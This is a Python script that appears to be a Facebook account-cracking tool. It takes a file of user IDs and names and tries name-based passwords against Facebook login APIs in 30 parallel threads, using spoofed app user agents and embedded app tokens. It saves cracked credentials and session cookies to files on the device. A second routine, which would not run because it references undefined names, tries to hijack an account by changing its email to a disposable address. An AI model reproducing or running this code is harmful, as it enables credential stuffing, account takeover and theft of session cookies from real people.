#-*-coding:utf-8-*-
#!/usr/bin/python3
#!/coding by Mahadi x Sefat
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as M4H4D1
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from fake_email import Email
os.system('git pull');os.system('termux-setup-storage')
try:
    import requests
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')
    
#------------------[ ID DATE ]-------------------#
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\033[1;31m"
green="\033[1;32m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;41m"
pvt = "\033[1;0m"
my_color = [white,blue,green];warna = random.choice(my_color)
loop = 0
oks = []
cps = []
id = []

#os.system('xdg-open https://github.com/SEFAT-MAHADI')
def logo():
    os.system('clear')
    print(f"""     {green}┏━┓{rad}┏━╸{yellow}┏━╸{blue}┏━┓{purple}╺┳╸ {cyan} ┏┳┓{white}┏━┓{green}╻ ╻{rad}┏━┓{white}╺┳┓{green}╻
     {green}┗━┓{rad}┣━╸{yellow}┣━╸{blue}┣━┫ {purple}┃ {yelloww}x{cyan} ┃┃┃{white}┣━┫{green}┣━┫{rad}┣━┫{white} ┃┃{green}┃
     {green}┗━┛{rad}┗━╸{yellow}╹  {blue}╹ ╹{purple} ╹  {cyan} ╹ ╹{white}╹ ╹{green}╹ ╹{rad}╹ ╹{white}╺┻┛{green}╹
{green}┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
{green}┃{rad}CEO :{green} MAHADI HASAN AFRIDI{green}┃{purple}  TYPE : {blue}FREE  {green}┃
{green}┃{rad}CEO : {yelloww}SEFAT SARKER       {green}┃{cyan} VERSION : {white}0.1 {green}┃
{green}┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫
{green}┃{yellow}GITHUB : {white}SEFAT-MAHADI {green}┃{yelloww}TOOL : {white}{faltu}FILE CLONE{pvt}{green} ┃
{green}┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛""")

def linex():
        print(f"{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                     
def mahadi():
    os.system('clear');logo()
    m = f"\x1b[38;5;82m[A] START FILE CRACKING\n"
    n = f"\x1b[38;5;83m[B] START FILE MAKING\n"
    p = f"\x1b[38;5;84m[C] ADD MESSENGER GROUP\n"
    w = f"\x1b[38;5;85m[D] EXIT TOOL"
    L = m + n + p + w
    print(L)
    __Mahadi__ = input(f'\x1b[38;5;86m[+] SELECT : {yelloww}')
    if __Mahadi__ in ['A','a','01','1']:
        __Hasan__()
    elif __Mahadi__ in ['B','b','02','2']:
        os.system('xdg-open https://www.facebook.com/M4HADI.143')
    elif __Mahadi__ in ['C','c','03','3']:
        os.system('xdg-open https://m.me/j/Abbh_VtYZ3YtOpBX/')
    elif __Mahadi__ in ['D','d','04','4']:
        exit()
    else:
        print(f'\n[×]{rad} CHOOSE VALID OPTION... ');mahadi()
        
def __Hasan__():
    global oks,cps
    os.system('clear');logo()
    dfile = input(f'\x1b[38;5;86m[/] EXAMPLE \033[1;91m[sdcard/mahadi.txt]\n\x1b[38;5;87m[\] ENTER FILE PATH : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__Hasan__()
    dplist = []
    try:
        os.system('clear');logo()
        pass_lmit = int(input('\x1b[38;5;154m[/] ENTER PASSWORD LIMIT : '))
    except:
        pass_lmit =1
    for i in range(pass_lmit):
        dplist.append(input(f'\x1b[38;5;155m[\] EXAMPLE \033[1;91m[firstlast first123 first1234 ETC]\n\x1b[38;5;156m[/] PASSWORD NO.{i+1} : '))
    with ThreadPool(max_workers=30) as Mahadi:
        os.system('clear');logo();total_ids = str(len(dx))
        M = f"{green}[{rad}+{green}] TOTAL ID\033[1;97m  : {total_ids}\n"
        N = f"{green}[{rad}+{green}] IF NO RESULT {rad}[{yelloww}ON{white}/{yelloww}OFF{rad}] {green}AIRPLANE MODE"
        P = M + N;print(P);linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            Mahadi.submit(__Fire__,ids,names,passlist)
    print('');linex()
    E = f"{green}[{rad}+{green}] THE PROCESS HAS COMPLETE\n"
    F = f"{green}[{rad}+{green}] TOTAL ID : {white}{len(oks)}"
    O = E + F;print(O);linex();exit()

def __MAHADI___():
    bal1=f'Dalvik/2.1.0 (Linux; U; Android 7; Oppo J793V Build/NRB0YP) [FBAN/EMA;FBAV/183.0.0.61.23;FBBV/595127737;FBRV/0;FBPN/com.facebook.lite;FBLC/en_US;FBMF/OPPO;FBBD/OPPO;FBDV/Oppo J793V;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
    bal2=f'Dalvik/2.1.0 (Linux; U; Android 4; Oppo J793V Build/JOYXTF) [FBAN/FB4A;FBAV/220.0.0.71.11;FBBV/150772354;FBRV/0;FBPN/com.facebook.katana;FBLC/en_GB;FBMF/OPPO;FBBD/OPPO;FBDV/Oppo J793V;FBSV/4;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
    bal3=f'Dalvik/2.1.0 (Linux; U; Android 11; Oppo J793V Build/RQ1C.339156.022) [FBAN/FBIOS;FBAV/206.0.0.71.93;FBBV/694516881;FBRV/0;FBPN/com.facebook.orca;FBLC/en_GB;FBMF/OPPO;FBBD/OPPO;FBDV/Oppo J793V;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+f'FB_FW/1;]'
    bal4=f'Dalvik/2.1.0 (Linux; U; Android 9; Oppo J793V Build/PPR1.177516.020) [FBAN/MobileAdsManagerAndroid;FBAV/188.0.0.21.11;FBBV/568887649;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_GB;FBMF/OPPO;FBBD/OPPO;FBDV/Oppo J793V;FBSV/9;FBCA/armeabi-v8a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+f'FB_FW/1;]'
    bal5=f'Dalvik/2.1.0 (Linux; U; Android 15; A5s Build/TQ2A.781546.041) [FBAN/FB4A;FBAV/147.0.0.40.77;FBBV/105454960;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBMF/OPPO;FBBD/OPPO;FBDV/A5s;FBSV/15;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+f'FB_FW/1;]'
    bal6=f'Dalvik/2.1.0 (Linux; U; Android 12; A5s Build/SD2A.996536.019) [FBAN/EMA;FBAV/306.0.0.90.88;FBBV/952371794;FBRV/0;FBPN/com.facebook.lite;FBLC/en_US;FBMF/OPPO;FBBD/OPPO;FBDV/A5s;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+f'FB_FW/1;]'
    bal7=f'Dalvik/2.1.0 (Linux; U; Android 6; A5s Build/MGV7U6) [FBAN/MobileAdsManagerAndroid;FBAV/231.0.0.67.80;FBBV/311913324;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/OPPO;FBBD/OPPO;FBDV/A5s;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+f'FB_FW/1;]'
    bal8=f'Dalvik/2.1.0 (Linux; U; Android 5; A5s Build/LJW4R9) [FBAN/FBIOS;FBAV/203.0.0.83.22;FBBV/465666799;FBRV/0;FBPN/com.facebook.orca;FBLC/bn_IN;FBMF/OPPO;FBBD/OPPO;FBDV/A5s;FBSV/5;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+f'FB_FW/1;]'
    bal9=f'Dalvik/2.1.0 (Linux; U; Android 8; GREEN 2020 Build/OPM1.515294.038) [FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/'+'{density=2.0,width=720,height=1456};'+f'FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    return random.choice([bal1,bal2,bal3,bal4,bal5,bal6,bal7,bal8,bal9])
    
def __UBI___():
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code=str(random.randint(000000000,999999999))
    android_version=str(random.randrange(6,13))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    ua1 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Oppo J793V Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/{str(application_version_code)};FBPN/{str(fbs)};FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo J793V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
    ua2 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; ASUS_X00RD Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1352};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/banglalink;FBMF/asus;FBBD/asus;FBPN/{str(fbs)};FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua3 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; moto z4 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2120};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Verizon;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/moto z4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua4 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/AT&amp;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; SM-G973U Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2024};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
    ua6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/grameenphone;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua7 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; HUAWEI VNS-L21 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1812};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Vodafone UA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/HUAWEI VNS-L21;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua8 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; PRA-LX1 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1794};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/AT&amp;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua9 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; GREEN 2020 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1456};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/robi;FBMF/Green;FBBD/Green;FBPN/{str(fbs)};FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9])

def __Fire__(ids,names,passlist):
    sys.stdout.write(f'\r\r{rad}[{green}FINDING{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}ALIVE:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            mmail=Email().Mail()
            em=mmail['mail']
            passs = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            uid = '100052667114477'
            pas = '881732'
            data={
            'email': uid,
            'cuid': '',
            'guid': 'f7d923be260ada3ea',
            'lgnjs': '1733767601',
            'lgnrnd': '100640_NiY9',
            'locale': 'en_GB',
            'login_source': 'comet_login_header',
            'next': 'https://www.facebook.com/gfgd',
            'skstamp': '',
            'timezone': '-330',
            'prefill_contact_point': '',
            'prefill_source': '',
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPf^%^2FfPAPPBFAC',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
            head={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://web.facebook.com',
            'DNT': '1',
            'Alt-Used': 'web.facebook.com',
            'Connection': 'keep-alive',
            'Referer': 'https://web.facebook.com/gfgd',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',}
            response=requests.post('https://web.facebook.com/login/device-based/regular/login/?login_attempt=1',data=data,headers=head,allow_redirects=False).json()
            response=requests.get("https://mbasic.facebook.com")
            if "checkpoint" in response.text:
                return "chk"
            headers = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'}
            for i in  re.findall('href="/changeemail(.*?)"',response.text):
                url="/changeemail"+i
            response = requests.get("https://mbasic.facebook.com"+url, headers=headers)
            headers = {
            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '21',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'}
            data = {
            'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(response.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"',str(response.text)).group(1),
            'old_email': re.search('name="old_email" value="(.*?)"',str(response.text)).group(1),
            'reg_instance': re.search('name="reg_instance" value="(.*?)"',str(response.text)).group(1),
            'new': em,
            'next': '',
            'submit': 'Add'}
            url = "https://m.facebook.com"+re.findall('action="(.*?)"',response.text)[0]
            submit = requests.post(url, headers=headers, data=data)
            r=requests.get("https://touch.facebook.com")
            while True:
               h=Email(mmail["session"]).inbox()
               if h:
                   j = h['topic'].split('-')[1];hh = j.split(' ')[0]
                   cd = hh
                   break
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not;A-Brand";v="99","Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not;A-Brand";v="99.0.0.0","Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-ch-ua-platform-version': '11.0.0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'}
            data = {'contact': em,
            'type': 'submit',
            'is_soft_cliff': False,
            'medium': 'email',
            'code': cd,
            'fb_dtsg': find(r.text,"fb_dtsg"),
            'jazoest': find(r.text,"jazoest"),
            '__user': dict(requests.cookies)['c_user']}
            url = 'https://m.facebook.com/confirmation_cliff/'
            response = requests.post(url, headers=headers, data=data)
            dc=dict(requests.cookies)
            cok=";".join([k+"="+v for k,v in dc.items()])
            uid=re.findall("c_user=(.*?);",cok)[0]
            coki = cvt('ok',requests.cookies.get_dict())+"dpr=2;locale=en_US;wd=950x1835;m_page_voice="+uid
            print("\r\r\033[1;32m [OK] "+uid+'|'+pas+'|'+coki)
            ok+=1
            open(file,"a").write(uid+"|"+pas+"|"+coki+"\n")
            linex()
    except Exception as e:
     if not "urllib" and not "perma" in str(e):print(e)
     pass

def __Firue__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{rad}[{green}FINDING{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}ALIVE:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent":__UBI___(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                print('\r\r\033[1;32m[OK] '+ids+' | '+pas)
                oks.append(ids)
                open('/sdcard/OK.txt','a').write(ids+'|'+pas+'\n')
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                open('/sdcard/COKIS.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
        
mahadi()
